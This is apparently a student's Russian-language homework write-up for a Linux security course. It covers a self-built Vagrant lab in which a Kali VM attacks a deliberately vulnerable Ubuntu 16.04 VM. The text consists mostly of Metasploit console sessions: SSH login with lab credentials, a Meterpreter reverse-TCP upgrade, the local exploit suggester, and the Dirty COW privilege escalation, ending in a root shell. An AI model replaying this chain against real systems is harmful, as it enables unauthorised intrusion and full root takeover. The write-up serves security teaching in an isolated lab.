Домашние задания по курсу "Безопасность Linux"
===============================================

ДЗ 3 - dirtycow exploit - centos, ubuntu, metasploit
-----------------------------------------------

1. Centos
2. Ubuntu
3. Metasploit
- использовал материалы
https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/

в vagrantfile плейбуками ansible 
- поднимаем уязвимую vm nodebuntu на ubuntu 16.04 с ядром 4.4.0-42 (nodebuntu/bootstrap.yml), ip 192.168.99.102
- создаем на vm nodebuntu пользователя otus с обычными правами и паролем vic!!vak

- поднимаем vm nodeintruder на kali/rolling 2020.1 (nodeintruder/bootstrap.yml)
- копируем эксплоит (nodeintruder/msf/dirtycow_priv_exc.rb) в папку metasploit 

- заходим на nodeintruder: vagrant ssh nodeintruder
- запускаем консоль msf: msfconsole -q
- создаем сессию ssh с vm nodebuntu (192.168.99.102):
<code>
    msf5 > use auxiliary/scanner/ssh/ssh_login

    msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.99.102
    
    rhosts => 192.168.99.102
    msf5 auxiliary(scanner/ssh/ssh_login) > set username otus
    username => otus
    
    msf5 auxiliary(scanner/ssh/ssh_login) > set password vic!!vak
    
    password => vic!!vak
    
    msf5 auxiliary(scanner/ssh/ssh_login) > run

    [+] 192.168.99.102:22 - Success: 'otus:vic!!vak' ''
    [*] Command shell session 1 opened (192.168.99.103:38379 -> 192.168.99.102:22) at 2020-02-26 15:23:30 -0500
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    
    msf5 auxiliary(scanner/ssh/ssh_login) > sessions


    Active sessions
    ===============

    Id  Name  Type           Information                            Connection
    --  ----  ----           -----------                            ----------
    1         shell unknown  SSH otus:vic!!vak (192.168.99.102:22)  192.168.99.103:38379 -> 192.168.99.102:22 (192.168.99.102)
</code>

- апгрейдим сессию в meterpreter
<code>
    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1

    [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

    [!] SESSION may not be compatible with this module.
    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on 192.168.99.103:4433 
    [*] Sending stage (985320 bytes) to 192.168.99.102
    [*] Meterpreter session 2 opened (192.168.99.103:4433 -> 192.168.99.102:41734) at 2020-02-26 15:28:41 -0500
    [-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -l

    Active sessions
    ===============

    Id  Name  Type                   Information                                                Connection
    --  ----  ----                   -----------                                                ----------
    1         shell unknown          SSH otus:vic!!vak (192.168.99.102:22)                      192.168.99.103:38379 -> 192.168.99.102:22 (192.168.99.102)
    2         meterpreter x86/linux  uid=1001, gid=1001, euid=1001, egid=1001 @ 192.168.99.102  192.168.99.103:4433 -> 192.168.99.102:41734 (192.168.99.102)
</code>

- убедимся, что сессия запущена из под пользователя otus
<code>
    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -i 2

    [*] Starting interaction with 2...

    meterpreter > shell
    Process 10451 created.
    Channel 71 created.
    id
    uid=1001(otus) gid=1001(otus) groups=1001(otus)
    exit
    meterpreter > 
    Background session 2? [y/N]  
</code>

- смотрим, что нам может посоветовать metasploit suggester в данной ситуации
<code>
    msf5 auxiliary(scanner/ssh/ssh_login) > use post/multi/recon/local_exploit_suggester 

    msf5 post(multi/recon/local_exploit_suggester) > set session 2

    session => 2

    msf5 post(multi/recon/local_exploit_suggester) > run


    [*] 192.168.99.102 - Collecting local exploits for x86/linux...
    [*] 192.168.99.102 - 35 exploit checks are being tried...
    [+] 192.168.99.102 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
    [+] 192.168.99.102 - exploit/linux/local/dirtycow: The target appears to be vulnerable.
    [+] 192.168.99.102 - exploit/linux/local/dirtycow_priv_esc: The target appears to be vulnerable.
    [+] 192.168.99.102 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
    [+] 192.168.99.102 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
    [+] 192.168.99.102 - exploit/linux/local/pkexec: The service is running, but could not be validated.
    [*] Post module execution completed
</code>

- наблюдаем, среди прочего эксплоит dirtycow_priv_esc
- выбираем этот эксплоит, устанавливаем сессию, в которой запустим эксплоит, payload и параметры подключения
<code>
    msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/dirtycow_priv_esc

    msf5 exploit(linux/local/dirtycow_priv_esc) > set session 2

    session => 2

    msf5 exploit(linux/local/dirtycow_priv_esc) > set payload linux/x86/meterpreter/reverse_tcp

    payload => linux/x86/meterpreter/reverse_tcp

    msf5 exploit(linux/local/dirtycow_priv_esc) > set lhost 192.168.99.103

    lhost => 192.168.99.103

    msf5 exploit(linux/local/dirtycow_priv_esc) > set lport 4321

    lport => 4321
</code>

- запускаем эксплоит
<code>
    msf5 exploit(linux/local/dirtycow_priv_esc) > run

    [*] Started reverse TCP handler on 192.168.99.103:4321 
    [*] Writing '/tmp/.KvJCwYJAgaw.c' (3077 bytes) ...
    [-] Compiling failed:
    /tmp/.KvJCwYJAgaw.c: In function 'procselfmemThread':
    /tmp/.KvJCwYJAgaw.c:64:14: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [-Wint-conversion]
        lseek(f, map, SEEK_SET);
                ^
    In file included from /tmp/.KvJCwYJAgaw.c:8:0:
    /usr/include/unistd.h:337:16: note: expected '__off_t {aka long int}' but argument is of type 'void *'
    extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                    ^
    /tmp/.KvJCwYJAgaw.c: In function 'main':
    /tmp/.KvJCwYJAgaw.c:94:3: warning: implicit declaration of function 'asprintf' [-Wimplicit-function-declaration]
    asprintf(&backup, "cp %s /tmp/.mrSSZhTstx", suid_binary);
    ^
    /tmp/.KvJCwYJAgaw.c:98:3: warning: implicit declaration of function 'fstat' [-Wimplicit-function-declaration]
    fstat(f,&st);
    ^
    [*] Launching exploit...
    [*] Sending stage (985320 bytes) to 192.168.99.102
    [*] Meterpreter session 3 opened (192.168.99.103:4321 -> 192.168.99.102:60974) at 2020-02-26 15:59:13 -0500

    meterpreter > 

    [*] Setting '/proc/sys/vm/dirty_writeback_centisecs' to '0'...

    Background session 3? [y/N]  

</code>

- игнорируем ответ "compiling failed" - т.к. в выводе компилятора только предупреждения. 
- убеждаемся в успехе - смотрим открытую сессию 3, запускаем uname -a, id и т.п
<code>
    msf5 exploit(linux/local/dirtycow_priv_esc) > sessions -i 3
    
    [*] Starting interaction with 3...

    meterpreter > shell
    Process 3696 created.
    Channel 1 created.
    uname -r
    4.4.0-42-generic
    uname -a
    Linux nodebuntu 4.4.0-42-generic #62-Ubuntu SMP Fri Oct 7 23:11:45 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
    id
    uid=0(root) gid=0(root) groups=0(root),1001(otus)
    
</code>
